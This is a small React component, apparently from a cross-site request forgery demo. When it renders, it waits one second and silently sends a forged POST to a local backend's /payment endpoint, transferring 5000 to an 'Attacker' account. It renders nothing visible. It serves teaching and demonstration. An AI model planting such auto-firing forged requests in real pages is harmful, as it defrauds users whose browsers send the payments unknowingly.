import {useState, useCallback, useEffect} from "react";
import {Button, Alert, Container} from 'react-bootstrap';
import {useSession} from './Session';

const backendOrigin = 'http://localhost:3000';

export const Attacker = () => {
    useEffect(() => {
        setTimeout(() => {
            fetch(`${backendOrigin}/payment`, {
                body: new URLSearchParams({
                    'account': 'Attacker',
                    'amount': 5000
                }),
                method: 'POST',
            });
        }, 1000);
    });

    return <></>
};
